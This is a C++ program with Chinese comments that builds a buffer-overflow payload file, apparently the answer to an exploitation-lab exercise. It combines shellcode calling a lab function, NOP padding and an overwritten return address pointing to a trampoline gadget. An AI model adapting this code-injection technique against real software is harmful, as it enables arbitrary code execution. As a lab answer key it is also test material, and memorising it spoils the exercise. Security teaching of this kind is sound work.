#include <iostream>
#include <fstream>
#include <cstdint>
#include <cstring>

int main() {

    // "跳板"函数地址: jmp_xs
    // 它会自动跳转到Shellcode 存放的位置
    uint64_t gadget_trampoline = 0x401334;
    
    // 缓冲区总大小: 
    // 0x20 (32字节 buffer) + 8字节 saved_rbp = 40字节
    const int total_offset = 40;
    
    const char* output_filename = "ans3.txt";
    // ---------------------------------------------------------

    // 编写 Shellcode (机器码)
    // 功能: 调用 func1(114)
    // 汇编对应的十六进制机器码:
    char shellcode[] = {
        // mov $0x72, %edi       (将 114 放入 edi)
        '\xbf', '\x72', '\x00', '\x00', '\x00',
        
        // mov $0x401216, %eax   (将 func1 地址放入 eax)
        // 注意: 这里是 0x401216 (小端序: 16 12 40 00)
        '\xb8', '\x16', '\x12', '\x40', '\x00',
        
        // call *%rax            (调用 func1)
        '\xff', '\xd0'
    };

    // 3. 构建 Payload
    // 结构: [Shellcode] + [Padding] + [RetAddr -> jmp_xs]
    char payload[total_offset + 8]; // 40 + 8 = 48 bytes
    
    // 先把所有位置填成 NOP (0x90) 做填充，防止出问题
    memset(payload, 0x90, sizeof(payload));

    //  在最开头写入 Shellcode
    memcpy(payload, shellcode, sizeof(shellcode));

    // 在最后 (第40字节处) 写入跳板地址
    // 这里的 reinterpret_cast 用来在那个位置写入 8字节的地址
    *reinterpret_cast<uint64_t*>(&payload[total_offset]) = gadget_trampoline;

    // 4. 写入文件
    std::ofstream outfile(output_filename, std::ios::binary);
    outfile.write(payload, sizeof(payload));
    outfile.close();

    std::cout << "Shellcode 载荷 ans3.txt 已生成！" << std::endl;
    std::cout << "Payload 长度: " << sizeof(payload) << " 字节" << std::endl;
    
    return 0;
}